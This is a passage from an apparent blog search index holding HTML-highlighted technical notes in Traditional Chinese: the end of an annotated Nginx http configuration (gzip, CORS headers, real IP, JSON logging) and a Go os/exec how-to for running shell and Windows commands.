style=\"color:#ae81ff\"\u003e2048\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定 server_name 的 hash 表的大小，用於快速找到對應的 server_name，預設值取決於 CPU 的 L1 cache\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eserver_names_hash_bucket_size\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e256\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## server_tokens on | off | build | string; 是否在 Nginx 錯誤頁面顯示 Nginx 版本，預設為 on\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eserver_tokens\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eoff\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 是否在錯誤日誌記錄 404\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003elog_not_found\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eoff\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 是否啟用 sendfile() 提高文件傳輸效率，預設為 off\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003esendfile\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 文件是否使用完整封包發送，預設為 off\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003etcp_nopush\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 數據是否儘快傳送，預設為 on\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003etcp_nodelay\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定長連線持續秒數，超過時間 Nginx 會主動關閉連線，預設為 75\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003ekeepalive_timeout\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e70\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## client_max_body_size size; 設定請求允許最大的 body 大小\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eclient_max_body_size\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e64M\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## module: ngx_http_gzip_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## 是否啟用 gzip 壓縮，預設為 off\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003egzip\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定要壓縮的 Content-Length 最小值，預設為 20\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003egzip_min_length\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1k\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定壓縮緩衝大小，預設為一頁記憶體\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## gzip_buffers number size;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003egzip_buffers\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e32k\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定壓縮等級，範圍 1 ~ 9，預設為 1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003egzip_comp_level\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定要壓縮的 MIME 類型，預設為 text/html\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003egzip_types\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003etext/plain\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eapplication/x-javascript\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003etext/css\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eapplication/xml\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003etext/javascript\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eapplication/x-httpd-php\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eapplication/json\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 是否在 HTTP response header 增加 Vary: Accept-Encoding，預設為 off\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003egzip_vary\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 針對特定 User-Agent 禁用壓縮\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## 下方為設定禁用 IE 6\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003egzip_disable\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;MSIE\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e[1-6]\\.\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## resolver address ... [valid=time] [ipv6=on|off] [status_zone=zone]; 使用指定的 NS 解析 server_name, upstream server 等\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eresolver\u003c/span\u003e 114.114.114.114 8.8.8.8 1.1.1.1;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## module: ngx_http_headers_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## add_header name value [always]; 在 HTTP response header 增加欄位\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## 下方為設定允許跨域\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eadd_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eAccess-Control-Allow-Origin\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e*\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eadd_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eAccess-Control-Allow-Headers\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eDNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eadd_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eAccess-Control-Allow-Methods\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eGET,POST,OPTIONS\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eadd_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eAccess-Control-Expose-Headers\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;WWW-Authenticate,Server-Authorization,User-Identity-Token\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## module: ngx_http_realip_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## set_real_ip_from address | CIDR | unix:; 設定信任的可被替代的伺服器 IP，如反向代理伺服器\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eset_real_ip_from\u003c/span\u003e 10.0.0.0\u003cspan style=\"color:#e6db74\"\u003e/8\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eset_real_ip_from\u003c/span\u003e 172.16.0.0\u003cspan style=\"color:#e6db74\"\u003e/12\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eset_real_ip_from\u003c/span\u003e 192.168.0.0\u003cspan style=\"color:#e6db74\"\u003e/16\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## real_ip_header field | X-Real-IP | X-Forwarded-For | proxy_protocol; 定義使用哪個標頭取代獲取到的 client IP，預設為 X-Real-IP\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003ereal_ip_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eX-Forwarded-For\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 將 real_ip_header 設定的標頭中，「最後一個非信任伺服器 IP」或是「最後一個 IP」當成真實 IP，預設為 off\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003ereal_ip_recursive\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## module: ngx_http_log_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## log_format name [escape=default|json|none] string ...; 設定日誌格式\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003elog_format\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ejson\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eescape=json\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e{\u003cspan style=\"color:#f92672\"\u003e\u0026#34;@timestamp\u0026#34;:\u0026#34;$time_iso8601\u0026#34;,\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;@source\u0026#34;:\u0026#34;\u003c/span\u003e$server_addr\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;ip\u0026#34;:\u0026#34;\u003c/span\u003e$http_x_forwarded_for\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;client\u0026#34;:\u0026#34;\u003c/span\u003e$remote_addr\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;request_method\u0026#34;:\u0026#34;\u003c/span\u003e$request_method\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;scheme\u0026#34;:\u0026#34;\u003c/span\u003e$scheme\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;domain\u0026#34;:\u0026#34;\u003c/span\u003e$server_name\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;client_host\u0026#34;:\u0026#34;\u003c/span\u003e$host\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;referer\u0026#34;:\u0026#34;\u003c/span\u003e$http_referer\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;request\u0026#34;:\u0026#34;\u003c/span\u003e$request_uri\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;args\u0026#34;:\u0026#34;\u003c/span\u003e$args\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;sent_bytes\u0026#34;:\u003c/span\u003e$body_bytes_sent,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;status\u0026#34;:\u003c/span\u003e$status,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;responsetime\u0026#34;:\u003c/span\u003e$request_time,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;upstreamtime\u0026#34;:\u0026#34;\u003c/span\u003e$upstream_response_time\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;upstreamaddr\u0026#34;:\u0026#34;\u003c/span\u003e$upstream_addr\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;http_user_agent\u0026#34;:\u0026#34;\u003c/span\u003e$http_user_agent\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;Country\u0026#34;:\u0026#34;\u003c/span\u003e$geoip2_data_country_name\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;State\u0026#34;:\u0026#34;\u003c/span\u003e$geoip2_data_state_name\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;City\u0026#34;:\u0026#34;\u003c/span\u003e$geoip2_data_city_name\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;all_agent\u0026#34;:\u0026#34;\u003c/span\u003e$arg_agent\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;dfw_agent\u0026#34;:\u0026#34;\u003c/span\u003e$arg_proxy\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;nw2_agent\u0026#34;:\u0026#34;\u003c/span\u003e$arg_channel\u0026#34;,\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;https\u0026#34;:\u0026#34;\u003c/span\u003e$https\u0026#34;\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elog_format\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003emain\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e$remote_addr \u003cspan style=\"color:#e6db74\"\u003e-\u003c/span\u003e $remote_user \u003cspan style=\"color:#e6db74\"\u003e[\u003c/span\u003e$time_local] \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$request\u0026#34; \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e$status $body_bytes_sent \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$http_referer\u0026#34; \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;\u003c/span\u003e$http_user_agent\u0026#34; \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$http_x_forwarded_for\u0026#34;\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## access_log path [format [buffer=size] [gzip[=level]] [flush=time] [if=condition]]; 設定日誌寫入位置以及使用的日誌名稱\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## access_log off; 不紀錄日誌\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eaccess_log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003elogs/access.log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ejson\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["Nginx","config"],"title":"Nginx 筆記"},{"categories":["URL","Go"],"contents":" Golang os/exec 使用方法（筆記） 加入額外的環境參數再執行指令 cmd := exec.Command(\u0026#34;programToExecute\u0026#34;) additionalEnv := \u0026#34;FOO=bar\u0026#34; newEnv := append(os.Environ(), additionalEnv) cmd.Env = newEnv out, err := cmd.CombinedOutput() if err != nil { log.Fatalf(\u0026#34;cmd.Run() failed with %s\\n\u0026#34;, err) } fmt.Printf(\u0026#34;%s\u0026#34;, out) 在 Linux 下使用 os/exec + Pipe 或 Bash 運算式 rcmd := `iw dev | awk \u0026#39;$1==\u0026#34;Interface\u0026#34;{print $2}\u0026#39;` cmd := exec.Command(\u0026#34;bash\u0026#34;, \u0026#34;-c\u0026#34;, rcmd) out, err := cmd.CombinedOutput() if err != nil { log.Println(err.Error()) } log.Println(string(out)) 在 Windows 下使用 os/exec + Batch 運算式 cmd := exec.Command(\u0026#34;cmd\u0026#34;, \u0026#34;/c\u0026#34;, \u0026#34;ffmpeg -i myfile.mp4 myfile.mp3 \u0026amp;\u0026amp; del myfile.mp4\u0026#34;) out, err := cmd.CombinedOutput() if err != nil { log.Println(err.Error()) } log.Println(string(out)) 解決 Windows CMD 在 os/exec 時會出現本地語言的問題 cmd := exec.Command(\u0026#34;cmd\u0026#34;, \u0026#34;/c\u0026#34;, \u0026#34;chcp 65001 \u0026amp;\u0026amp; netsh WLAN show drivers\u0026#34;) out, err := cmd.CombinedOutput() if err != nil { log.Println(err.Error()) } log.Println(string(out)) 使用此方法得出的 output string 請記得把回傳的首行（chcp 的回傳結果）刪除掉再進行其他處理和讀取。\n","date":"November 12, 2021","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20211112-golang-ex-exec/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://124.244.86.40/wordpress/2020/10/25/golang-ex-exec-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%88%E7%AD%86%E8%A8%98%EF%BC%89/\" target=\"_blank\" rel=\"noopener\"\u003eGolang os/exec 使用方法（筆記）\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"加入額外的環境參數再執行指令\"\u003e加入額外的環境參數再執行指令\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ecmd\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eexec\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eCommand\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;programToExecute\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eadditionalEnv\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;FOO=bar\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003enewEnv\u003c/span\u003e \u003cspan 